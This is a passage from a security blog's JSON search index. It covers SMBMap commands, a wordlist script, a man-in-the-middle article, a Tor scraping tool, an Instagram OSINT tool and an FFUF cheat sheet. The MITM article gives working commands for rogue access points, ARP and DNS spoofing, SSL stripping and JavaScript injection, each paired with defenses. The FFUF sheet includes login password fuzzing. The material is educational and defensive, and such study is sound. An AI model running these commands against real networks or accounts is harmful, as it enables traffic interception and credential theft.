style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). ","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, 